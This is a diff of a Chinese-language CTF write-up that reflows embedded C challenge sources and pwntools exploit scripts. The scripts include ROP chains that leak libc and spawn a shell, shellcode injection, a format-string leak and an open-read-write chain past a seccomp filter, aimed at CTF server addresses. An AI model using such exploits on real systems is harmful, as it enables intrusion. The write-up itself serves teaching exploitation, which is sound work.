@@ -7,7 +7,10 @@
 
 该程序的C代码如下，因此我们只要使buff和test的前三十个字节相同即可。因此可以直接在比较处下断点查看buff数组的值即可。
 
-#include<stdio.h>char buff[100];int v0;char buffff[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234";char bua[]="abcdefghijklmnopqrstuvwxyz4321";char* enccrypt(char *buf){ int a; for(int i=0;i<29;i++){ a=rand(); buf[i]^=buffff[i]; buff[i]^=bua[i]; for(int j=29;j>=0;j--){ buf[j]=buff[i]; buf[i]+='2'; } buf[i]-=((bua[i]^0x30)*(buffff[i]>>2)&1)&0xff; buf[i]+=(a%buff[i])&0xff; }}int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("GDB-pwndbg maybe useful"); char buf[]="Ayaka_nbbbbbbbbbbbbbbbbb_pluss"; strcpy(buff,buf); char test[30]; int v0=1; srand(v0); enccrypt(buff); read(0,test,30); if(!strncmp(buff,test,30)){ system("/bin/sh"); } else { puts("Oh No!You lose!!!"); exit(0); } return; }
+#include<stdio.h>char buff[100];
+int v0;
+char buffff[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234";
+char bua[]="abcdefghijklmnopqrstuvwxyz4321";char* enccrypt(char *buf){ int a; for(int i=0;i<29;i++){ a=rand(); buf[i]^=buffff[i]; buff[i]^=bua[i]; for(int j=29;j>=0;j--){ buf[j]=buff[i]; buf[i]+='2'; } buf[i]-=((bua[i]^0x30)*(buffff[i]>>2)&1)&0xff; buf[i]+=(a%buff[i])&0xff; }}int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("GDB-pwndbg maybe useful"); char buf[]="Ayaka_nbbbbbbbbbbbbbbbbb_pluss"; strcpy(buff,buf); char test[30]; int v0=1; srand(v0); enccrypt(buff); read(0,test,30); if(!strncmp(buff,test,30)){ system("/bin/sh"); } else { puts("Oh No!You lose!!!"); exit(0); } return; }
 
 因此在0x4014b4处下断点，查看buff的值即可，将buff的值发送即可。（注意小端模式）
 
@@ -41,7 +44,9 @@ from pwn import *from LibcSearcher import *context.log_level='debug'#io=process(
 
 该程序的c代码如下，它先读取入了flag文件，然后将该值赋给了pointer。而在最后的printf函数中存在着格式化字符串漏洞。
 
-#include<stdio.h>char name[0x30];int key;int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("Welcome to the world of fmtstr"); puts("> "); int fd=open("flag",0); if(fd==-1){ perror("Open failed."); } read(fd,name,0x30); size_t *pointer=&name; char buf[0x100]; puts("Input your format string."); read(0,buf,0x100); puts("Ok."); printf(buf);}
+#include<stdio.h>char name[0x30];
+int key;
+int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("Welcome to the world of fmtstr"); puts("> "); int fd=open("flag",0); if(fd==-1){ perror("Open failed."); } read(fd,name,0x30); size_t *pointer=&name; char buf[0x100]; puts("Input your format string."); read(0,buf,0x100); puts("Ok."); printf(buf);}
 
 格式化字符串漏洞主要是因为printf不会检查格式化字符串中的占位符是否与所给的参数数目相等。而在printf输出的过程中，每遇到一个占位符，就会到“约定好”的位置获取数据并根据该占位符的类型解码并输出。因此我们可以通过输入恶意构造的格式化字符串来实现任意地址写，任意地址读。
 
@@ -53,7 +58,8 @@ from pwn import *context.log_level='debug'#io=process('./ezfmt')io=remote('43.14
 
 该程序的c代码如下，可以发现我们需要输入的指令的每个字符都处于‘0’~‘z’中，这样才会执行我们输入的指令。
 
-#include<stdio.h>char buff[0x200];int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[0x200]; memset(buf,0,0x200); read(0,buf,0x300); for(int i=0;i<strlen(buf);i++){ if(buf[i]<'0'||buf[i]>'z'){ puts("Hacker!!!"); exit(0); } } strcpy(buff,buf); ((void (*)(void))buff)(); return 0;}
+#include<stdio.h>char buff[0x200];
+int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[0x200]; memset(buf,0,0x200); read(0,buf,0x300); for(int i=0;i<strlen(buf);i++){ if(buf[i]<'0'||buf[i]>'z'){ puts("Hacker!!!"); exit(0); } } strcpy(buff,buf); ((void (*)(void))buff)(); return 0;}
 
 通过构造syscall执行read读入无限制shellcode。
 
@@ -61,7 +67,8 @@ from pwn import * context(log_level='debug',arch='amd64',os='linux') io=process(
 
 该程序c代码如下：
 
-#include<stdio.h>char buff[256];int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[256]; memset(buf,0,0x100); read(0,buf,0x110); strcpy(buff,buf); return 0;}
+#include<stdio.h>char buff[256];
+int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[256]; memset(buf,0,0x100); read(0,buf,0x110); strcpy(buff,buf); return 0;}
 
 可以知道该程序开辟了一段长度为0x1000的可读可写可执行的区域。
 
@@ -77,7 +84,8 @@ from pwn import *context.log_level='debug'context(os='linux', arch='amd64', log_
 
 IDA打开分析，发现是简单的逆向分析，需要确保输入的24数字经过运算之后与s2一致。因为计算比较简单，而且必须都是数字，因此我们可以直接在0-9中进行爆破即可，满足条件的即是正确的值。
 
-#!/usr/bin/env python# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')io=process('./arrayRE')#io=remote('43.143.7.97',28126)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()a='831654239123423452610584'flag='8'def decode(a1,a2): return (35*(a1-48)+18*(a2-48)+2)%10for i in range(len(a)-1): for j in range(10): if (decode(ord(a[i]),i+ord(a[i]))+int(j)+3)%10+48==ord(a[i+1]): flag+=str(j) breakprint(flag)rl()rl()sl(b'aaa')ru(b'password:')sl(flag)shell()
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')io=process('./arrayRE')#io=remote('43.143.7.97',28126)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()a='831654239123423452610584'flag='8'def decode(a1,a2): return (35*(a1-48)+18*(a2-48)+2)%10for i in range(len(a)-1): for j in range(10): if (decode(ord(a[i]),i+ord(a[i]))+int(j)+3)%10+48==ord(a[i+1]): flag+=str(j) breakprint(flag)rl()rl()sl(b'aaa')ru(b'password:')sl(flag)shell()
 
 先看程序保护：
 
@@ -95,7 +103,8 @@ ida打开分析，可以发现该程序存在seccomp沙箱，即限制了可用�
 
 所以此题流程为先利用puts函数泄露puts函数地址，然后再劫持控制流返回到main函数再次造成溢出，在此构造rop链来达成orw。
 
-#!/usr/bin/env python# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')elf=ELF('./intorw')libc=ELF('./libc.so.6')io=process('./intorw')io=remote('43.143.7.97',28254)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'-1000')read_plt=elf.plt['read']pop_addr=0x0400ACAmov_addr=0x00400AB0puts_plt=elf.plt['puts']puts_got=elf.got['puts']bss=0x6010E0pop_rdi=0x400ad3payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4009C4)rl()sl(payload)puts_addr=u64(ru(b'x7f').ljust(8,b'x00'))libc_base=puts_addr-libc.sym['puts']pop_rsi=0x2be51+libc_basepop_rdx_r12=0x11f497+libc_baseprint(hex(libc_base))opEn=libc_base+libc.sym['open']write=libc_base+libc.sym['write']rl()rl()sl(b'-100')rl()payload=b'a'*0x28+p64(pop_rdi)+p64(0x601046)+p64(pop_rsi)+p64(0)+p64(opEn)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601000)+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x601000)+p64(puts_plt)sl(payload)rl()
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')elf=ELF('./intorw')libc=ELF('./libc.so.6')io=process('./intorw')io=remote('43.143.7.97',28254)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'-1000')read_plt=elf.plt['read']pop_addr=0x0400ACAmov_addr=0x00400AB0puts_plt=elf.plt['puts']puts_got=elf.got['puts']bss=0x6010E0pop_rdi=0x400ad3payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4009C4)rl()sl(payload)puts_addr=u64(ru(b'x7f').ljust(8,b'x00'))libc_base=puts_addr-libc.sym['puts']pop_rsi=0x2be51+libc_basepop_rdx_r12=0x11f497+libc_baseprint(hex(libc_base))opEn=libc_base+libc.sym['open']write=libc_base+libc.sym['write']rl()rl()sl(b'-100')rl()payload=b'a'*0x28+p64(pop_rdi)+p64(0x601046)+p64(pop_rsi)+p64(0)+p64(opEn)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601000)+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x601000)+p64(puts_plt)sl(payload)rl()
 
 链接：https://pan.baidu.com/s/1wB9peKp2BL8h2tmjruPqlQ
 
@@ -131,79 +140,28 @@ https://bbs.pediy.com/user-home-967128.htm
 
 
 ```
-#include<stdio.h>char buff[100];int v0;char buffff[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234";char bua[]="abcdefghijklmnopqrstuvwxyz4321";char* enccrypt(char *buf){ int a; for(int i=0;i<29;i++){ a=rand(); buf[i]^=buffff[i]; buff[i]^=bua[i]; for(int j=29;j>=0;j--){ buf[j]=buff[i]; buf[i]+='2'; } buf[i]-=((bua[i]^0x30)*(buffff[i]>>2)&1)&0xff; buf[i]+=(a%buff[i])&0xff; }}int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("GDB-pwndbg maybe useful"); char buf[]="Ayaka_nbbbbbbbbbbbbbbbbb_pluss"; strcpy(buff,buf); char test[30]; int v0=1; srand(v0); enccrypt(buff); read(0,test,30); if(!strncmp(buff,test,30)){ system("/bin/sh"); } else { puts("Oh No!You lose!!!"); exit(0); } return; }
-```
-
-
-
-```
+    #include<stdio.h>char buff[100];
+int v0;
+char buffff[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234";
+char bua[]="abcdefghijklmnopqrstuvwxyz4321";char* enccrypt(char *buf){ int a; for(int i=0;i<29;i++){ a=rand(); buf[i]^=buffff[i]; buff[i]^=bua[i]; for(int j=29;j>=0;j--){ buf[j]=buff[i]; buf[i]+='2'; } buf[i]-=((bua[i]^0x30)*(buffff[i]>>2)&1)&0xff; buf[i]+=(a%buff[i])&0xff; }}int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("GDB-pwndbg maybe useful"); char buf[]="Ayaka_nbbbbbbbbbbbbbbbbb_pluss"; strcpy(buff,buf); char test[30]; int v0=1; srand(v0); enccrypt(buff); read(0,test,30); if(!strncmp(buff,test,30)){ system("/bin/sh"); } else { puts("Oh No!You lose!!!"); exit(0); } return; }
 from pwn import *context.log_level='debug'#io=process('./ezcmp')io=remote('43.143.7.97',28931)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'x72x40x0exdcxaax78x46x14xe2xb0x7ex4cx1axe8xb6x84x52x20xeexbcx8ax58x26xf4xc2x90x5ex2cxcbxc8')shell()
-```
-
-
-
-```
 from pwn import *context.log_level='debug'#io=process('./ezr0p')io=remote('1.14.71.254',28637)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'/bin/sh')rl()payload=b'a'*0x20+p32(0x08048562)+p32(0x0804A080)sl(payload)shell()
-```
-
-
-
-```
 from pwn import *from LibcSearcher import *context.log_level='debug'#io=process('./ezrop64')elf=ELF('./ezrop64')libc=ELF('./libc.so.6')puts_got=elf.got['puts']puts_plt=elf.plt['puts']printf_got=elf.got['printf']io=remote('1.14.71.254',28658)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()ru(b'Gift :')puts_addr=int(r(14)[:],16)baseadd=puts_addr-libc.symbols['puts']print(hex(baseadd))system=baseadd+libc.symbols['system']print(hex(system))binsh=baseadd+libc.search(b'/bin/sh').__next__()print(hex(binsh))payload=b'a'*0x108+p64(0x4012a3)+p64(binsh)+p64(0x40101a)+p64(system)ru('Start your rop.n')sl(payload)shell()
-```
-
-
-
-```
-#include<stdio.h>char name[0x30];int key;int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("Welcome to the world of fmtstr"); puts("> "); int fd=open("flag",0); if(fd==-1){ perror("Open failed."); } read(fd,name,0x30); size_t *pointer=&name; char buf[0x100]; puts("Input your format string."); read(0,buf,0x100); puts("Ok."); printf(buf);}
-```
-
-
-
-```
+    #include<stdio.h>char name[0x30];
+int key;
+int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); puts("Welcome to the world of fmtstr"); puts("> "); int fd=open("flag",0); if(fd==-1){ perror("Open failed."); } read(fd,name,0x30); size_t *pointer=&name; char buf[0x100]; puts("Input your format string."); read(0,buf,0x100); puts("Ok."); printf(buf);}
 from pwn import *context.log_level='debug'#io=process('./ezfmt')io=remote('43.143.7.97',28705)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()rl()rl()payload=b'%7$s....'+p64(0x4040a0)s(payload)rl()
-```
-
-
-
-```
-#include<stdio.h>char buff[0x200];int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[0x200]; memset(buf,0,0x200); read(0,buf,0x300); for(int i=0;i<strlen(buf);i++){ if(buf[i]<'0'||buf[i]>'z'){ puts("Hacker!!!"); exit(0); } } strcpy(buff,buf); ((void (*)(void))buff)(); return 0;}
-```
-
-
-
-```
+    #include<stdio.h>char buff[0x200];
+int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[0x200]; memset(buf,0,0x200); read(0,buf,0x300); for(int i=0;i<strlen(buf);i++){ if(buf[i]<'0'||buf[i]>'z'){ puts("Hacker!!!"); exit(0); } } strcpy(buff,buf); ((void (*)(void))buff)(); return 0;}
 from pwn import * context(log_level='debug',arch='amd64',os='linux') io=process('./shellcoder')attach(io)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()pause()shellcode=''' push rax pop rsi push 0x40404040 pop rax xor rax,0x40404040 push rax pop rdi push 0x40404040 pop rax xor rax,0x40404141 push rax pop rdx push 0x40404040 pop rax xor rax,0x40404040 push 0x60604040 pop rcx xor dword ptr[rsi+0x33],ecx '''s(asm(shellcode)+b'x4fx45x30x30')payload=b'a'*0x35+asm(shellcraft.sh())sl(payload)shell()
-```
-
-
-
-```
-#include<stdio.h>char buff[256];int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[256]; memset(buf,0,0x100); read(0,buf,0x110); strcpy(buff,buf); return 0;}
-```
-
-
-
-```
+    #include<stdio.h>char buff[256];
+int main(){ setbuf(stdin,0); setbuf(stderr,0); setbuf(stdout,0); mprotect((long long)(&stdout)&0xfffffffffffff000,0x1000,7); char buf[256]; memset(buf,0,0x100); read(0,buf,0x110); strcpy(buff,buf); return 0;}
 from pwn import *context.log_level='debug'context(os='linux', arch='amd64', log_level='debug')#io=process('./shellcode')io=remote('43.143.7.97',28497)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()payload=asm(shellcraft.sh())sl(payload.ljust(0x108,b'x00')+p64(0x4040a0))shell()
-```
-
-
-
-```
-#include<stdio.h>int main(){ setbuf(stdin,0); setbuf(stdout,0); setbuf(stderr,0); puts("Input something"); char name[30]; int number=0; gets(name); if(number!=0){ puts("You win."); system("cat flag"); } return 0;
-```
-
-
-
-```
-#!/usr/bin/env python# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')io=process('./arrayRE')#io=remote('43.143.7.97',28126)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()a='831654239123423452610584'flag='8'def decode(a1,a2): return (35*(a1-48)+18*(a2-48)+2)%10for i in range(len(a)-1): for j in range(10): if (decode(ord(a[i]),i+ord(a[i]))+int(j)+3)%10+48==ord(a[i+1]): flag+=str(j) breakprint(flag)rl()rl()sl(b'aaa')ru(b'password:')sl(flag)shell()
-```
-
-
-
-```
-#!/usr/bin/env python# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')elf=ELF('./intorw')libc=ELF('./libc.so.6')io=process('./intorw')io=remote('43.143.7.97',28254)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'-1000')read_plt=elf.plt['read']pop_addr=0x0400ACAmov_addr=0x00400AB0puts_plt=elf.plt['puts']puts_got=elf.got['puts']bss=0x6010E0pop_rdi=0x400ad3payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4009C4)rl()sl(payload)puts_addr=u64(ru(b'x7f').ljust(8,b'x00'))libc_base=puts_addr-libc.sym['puts']pop_rsi=0x2be51+libc_basepop_rdx_r12=0x11f497+libc_baseprint(hex(libc_base))opEn=libc_base+libc.sym['open']write=libc_base+libc.sym['write']rl()rl()sl(b'-100')rl()payload=b'a'*0x28+p64(pop_rdi)+p64(0x601046)+p64(pop_rsi)+p64(0)+p64(opEn)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601000)+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x601000)+p64(puts_plt)sl(payload)rl()
+    #include<stdio.h>int main(){ setbuf(stdin,0); setbuf(stdout,0); setbuf(stderr,0); puts("Input something"); char name[30]; int number=0; gets(name); if(number!=0){ puts("You win."); system("cat flag"); } return 0;
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')io=process('./arrayRE')#io=remote('43.143.7.97',28126)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()a='831654239123423452610584'flag='8'def decode(a1,a2): return (35*(a1-48)+18*(a2-48)+2)%10for i in range(len(a)-1): for j in range(10): if (decode(ord(a[i]),i+ord(a[i]))+int(j)+3)%10+48==ord(a[i+1]): flag+=str(j) breakprint(flag)rl()rl()sl(b'aaa')ru(b'password:')sl(flag)shell()
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-from pwn import *from LibcSearcher import *context(log_level='debug',arch='amd64',os='linux')elf=ELF('./intorw')libc=ELF('./libc.so.6')io=process('./intorw')io=remote('43.143.7.97',28254)s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rl()sl(b'-1000')read_plt=elf.plt['read']pop_addr=0x0400ACAmov_addr=0x00400AB0puts_plt=elf.plt['puts']puts_got=elf.got['puts']bss=0x6010E0pop_rdi=0x400ad3payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4009C4)rl()sl(payload)puts_addr=u64(ru(b'x7f').ljust(8,b'x00'))libc_base=puts_addr-libc.sym['puts']pop_rsi=0x2be51+libc_basepop_rdx_r12=0x11f497+libc_baseprint(hex(libc_base))opEn=libc_base+libc.sym['open']write=libc_base+libc.sym['write']rl()rl()sl(b'-100')rl()payload=b'a'*0x28+p64(pop_rdi)+p64(0x601046)+p64(pop_rsi)+p64(0)+p64(opEn)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601000)+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0x601000)+p64(puts_plt)sl(payload)rl()
 ```
 
 
